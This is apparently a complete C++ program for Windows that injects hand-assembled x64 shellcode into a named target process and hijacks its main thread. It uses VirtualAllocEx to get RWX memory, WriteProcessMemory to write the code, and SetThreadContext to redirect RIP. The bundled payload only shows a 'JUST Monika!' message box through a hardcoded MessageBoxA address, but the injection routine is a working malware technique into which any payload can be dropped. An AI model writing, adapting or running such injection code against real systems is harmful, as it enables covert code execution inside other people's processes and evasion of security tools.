#include <windows.h>
#include <tlhelp32.h>
#include <cstdio>

const BYTE shellcode[] = {
    0x50,                          // push rax
    0x53,                          // push rbx
    0x51,                          // push rcx
    0x52,                          // push rdx
    0x56,                          // push rsi
    0x57,                          // push rdi
    0x41, 0x50,                    // push r8
    0x41, 0x51,                    // push r9
    0x41, 0x52,                    // push r10
    0x41, 0x53,                    // push r11
    0x41, 0x54,                    // push r12
    0x41, 0x55,                    // push r13
    0x41, 0x56,                    // push r14
    0x41, 0x57,                    // push r15
    0x55,                          // push rbp
    0x48, 0x8B, 0xEC,              // mov rbp, rsp
    0x48, 0x83, 0xEC, 0x28,        // sub rsp, 0x28 (MessageBoxA Strick Call Convention)
    0xE8, 0x00, 0x00, 0x00, 0x00,  // call $+5 (self-relative)
    0x5A,                          // pop rdx
    0x48, 0x83, 0xC2, 0x3C,        // add rdx, 0x3C (adjust rdx to point to "JUST Monika!")
    0x48, 0x31, 0xC9,              // xor rcx, rcx (HWND = NULL)
    0x4C, 0x8B, 0xC2,              // mov r8, rdx (R8 = address of "JUST Monika!")
    0x49, 0x83, 0xC0, 0x0d,        // add r8, 0x0d (adjust R8 to point to "ALERT")
    0x4D, 0x31, 0xC9,              // xor r9, r9 (uType = MB_OK)
    0x48, 0xB8, 0x60, 0xE0, 0x94, 0x1A, 0xFC, 0x7F, 0x00, 0x00, // mov rax, <MessageBoxA address>
    0xFF, 0xD0,                    // call rax (call MessageBoxA)
    0x48, 0x83, 0xC4, 0x28,        // add rsp, 32 (restore stack)
    0x5D,                          // pop rbp
    0x41, 0x5F,                    // pop r15
    0x41, 0x5E,                    // pop r14
    0x41, 0x5D,                    // pop r13
    0x41, 0x5C,                    // pop r12
    0x41, 0x5B,                    // pop r11
    0x41, 0x5A,                    // pop r10
    0x41, 0x59,                    // pop r9
    0x41, 0x58,                    // pop r8
    0x5F,                          // pop rdi
    0x5E,                          // pop rsi
    0x5A,                          // pop rdx
    0x59,                          // pop rcx
    0x5B,                          // pop rbx
    0x58,                          // pop rax
    0xC3,                          // ret
    0x90, 0x90,                    // nop nop (padding)
    // MessageBox strings (null-terminated)
    'J', 'U', 'S', 'T', ' ', 'M', 'o', 'n', 'i', 'k', 'a', '!', 0x00, // "JUST Monika!"
    'A', 'L', 'E', 'R', 'T', 0x00,                                         // "ALERT"
};

HANDLE hProcess = NULL;

// Function to get the PID of the target process by name
DWORD GetProcessIdByName(const char* processName)
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return 0;

    DWORD processId = 0;
    if (Process32First(hProcessSnap, &pe32))
    {
        do
        {
            if (strcmp(pe32.szExeFile, processName) == 0)
            {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return processId;
}

// Function to find the main thread of the target process
DWORD GetMainThreadId(DWORD processId)
{
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
        return 0;

    DWORD mainThreadId = 0;
    FILETIME earliestTime = { MAXDWORD, MAXDWORD };

    if (Thread32First(hThreadSnap, &te32))
    {
        do
        {
            if (te32.th32OwnerProcessID == processId)
            {
                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
                if (hThread)
                {
                    FILETIME creationTime, exitTime, kernelTime, userTime;
                    if (GetThreadTimes(hThread, &creationTime, &exitTime, &kernelTime, &userTime))
                    {
                        if (CompareFileTime(&creationTime, &earliestTime) < 0)
                        {
                            earliestTime = creationTime;
                            mainThreadId = te32.th32ThreadID;
                        }
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    return mainThreadId;
}

// Function to inject shellcode into the target process and return the address of the remote memory
LPVOID InjectShellcode(DWORD processId)
{
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess)
    {
        printf("Failed to open process with PID %lu\n", processId);
        return NULL;
    }

    // Allocate memory in the target process
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory)
    {
        printf("Failed to allocate memory in the target process\n");
        CloseHandle(hProcess);
        hProcess = NULL;
        return NULL;
    }
    printf("Allocated RWX memory at address: 0x%p\n", remoteMemory);

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, sizeof(shellcode), NULL))
    {
        printf("Failed to write shellcode to the allocated memory\n");
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        hProcess = NULL;
        return NULL;
    }
    printf("Shellcode written to remote memory successfully\n");
    return remoteMemory;
}

// Function to hijack the main thread and set its RIP to the injected shellcode
bool HijackMainThread(DWORD mainThreadId, LPVOID shellcodeAddress)
{
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, mainThreadId);
    if (!hThread)
    {
        printf("Failed to open main thread with TID %lu\n", mainThreadId);
        return false;
    }

    // Suspend the thread and get its context
    SuspendThread(hThread);
    printf("Suspended main thread with TID %lu\n", mainThreadId);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(hThread, &ctx))
    {
        printf("Original RIP: 0x%p\n", (LPVOID)ctx.Rip);
        // Backup to RSP
        ctx.Rsp -= sizeof(LPVOID);
        // Write the original RIP to the stack
        WriteProcessMemory(hProcess, (LPVOID)ctx.Rsp, &ctx.Rip, sizeof(LPVOID), NULL);
        printf("Original RIP Pushed to Stack: 0x%p\n", (LPVOID)ctx.Rsp);

        // Set RIP to the shellcode address
        ctx.Rip = (DWORD64)shellcodeAddress;
        printf("Hijacking RIP to address: 0x%p\n", shellcodeAddress);

        // Update the thread context
        if (!SetThreadContext(hThread, &ctx))
        {
            printf("Failed to set thread context\n");
            ResumeThread(hThread);
            CloseHandle(hThread);
            return false;
        }
    }
    else
    {
        printf("Failed to get thread context\n");
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // Resume the thread
    ResumeThread(hThread);
    printf("Resumed main thread with TID %lu\n", mainThreadId);
    CloseHandle(hThread);
    return true;
}

int main()
{
    const char* targetProcessName = "target.exe"; // Replace with your target process name
    DWORD processId = GetProcessIdByName(targetProcessName);

    if (processId)
    {
        printf("Target process \"%s\" found with PID %lu\n", targetProcessName, processId);

        // Inject shellcode and get the remote memory address
        LPVOID remoteMemory = InjectShellcode(processId);
        if (remoteMemory)
        {
            // Get the main thread ID
            DWORD mainThreadId = GetMainThreadId(processId);
            if (mainThreadId)
            {
                printf("Main thread found with TID %lu\n", mainThreadId);

                // Hijack the main thread
                if (HijackMainThread(mainThreadId, remoteMemory))
                    printf("Shellcode injected and main thread hijacked successfully.\n");
                else
                    printf("Failed to hijack main thread.\n");
            }
            else
            {
                printf("Failed to find main thread.\n");
            }
        }
        else
        {
            printf("Failed to inject shellcode.\n");
        }
    }
    else
    {
        printf("Target process \"%s\" not found.\n", targetProcessName);
    }

    return 0;
}
